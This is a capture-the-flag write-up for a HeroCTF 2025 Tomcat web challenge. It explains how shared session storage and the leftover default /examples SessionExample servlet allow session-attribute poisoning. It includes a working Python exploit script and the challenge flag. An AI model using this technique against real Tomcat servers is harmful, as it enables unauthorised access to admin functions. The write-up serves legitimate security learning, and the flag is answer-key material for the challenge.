web

The challenge presented a Tomcat environment hosting two custom web applications ("light" and "dark").
1.  **Vulnerability:** The `run.sh` script configured Tomcat to use a `PersistentManager` with `FileStore` and set the `sessionCookiePath` to `/`. This configuration causes the `JSESSIONID` cookie and the underlying session storage to be **shared across all web applications** running on the server.
2.  **Constraint:** The `LightServlet` allowed setting a `username` session attribute but explicitly forbade setting it to "darth_sidious". The `AdminServlet` in the `dark` context required the `username` to be exactly "darth_sidious" (case-insensitive) to reveal the flag.
3.  **Oversight:** While the `run.sh` script secured the Manager app with a random password (making it inaccessible), it **did not remove the default Tomcat web applications**, specifically `/examples`.
4.  **Exploit:** The default Tomcat `/examples` application includes a `SessionExample` servlet (`/examples/servlets/servlet/SessionExample`) that allows users to set arbitrary session attributes.
5.  **Execution:** By accessing the `SessionExample` servlet, I was able to set the session attribute `username` to `darth_sidious`. Because the session is shared, this attribute was persisted and accessible by the `AdminServlet` in the `dark` application, bypassing the filter in `LightServlet` and revealing the flag.

### Exploit Script

```python
import requests
import re

# Configuration
BASE_URL = "http://dyn10.heroctf.fr:11513"
SESSION_EXAMPLE_URL = f"{BASE_URL}/examples/servlets/servlet/SessionExample"
ADMIN_URL = f"{BASE_URL}/dark/admin"

def solve():
    s = requests.Session()
    
    print("[*] Accessing SessionExample to create session...")
    # 1. Access the SessionExample page to get a session
    resp = s.get(SESSION_EXAMPLE_URL)
    print(f"[*] Session ID: {s.cookies.get('JSESSIONID')}")

    # 2. Set the session attribute via the example servlet
    print("[*] Setting session attribute username=darth_sidious...")
    payload = {
        'dataname': 'username',
        'datavalue': 'darth_sidious'
    }
    resp = s.post(SESSION_EXAMPLE_URL, data=payload)
    
    if resp.status_code != 200:
        print(f"[-] Failed to set attribute: {resp.status_code}")
        return

    # 3. Access the Admin page with the poisoned session
    print(f"[*] Accessing Admin page: {ADMIN_URL}")
    resp = s.get(ADMIN_URL)
    
    if "Hero{" in resp.text:
        print("\n[+] SUCCESS! Flag found:")
        flag_match = re.search(r'(Hero\{.*?\})', resp.text)
        if flag_match:
            print(flag_match.group(1))
    else:
        print("[-] Flag not found.")

if __name__ == "__main__":
    solve()
```

**Flag:** `Hero{a2ae73558d29c6d438353e2680a90692}`

[[HeroCTF 2025]]
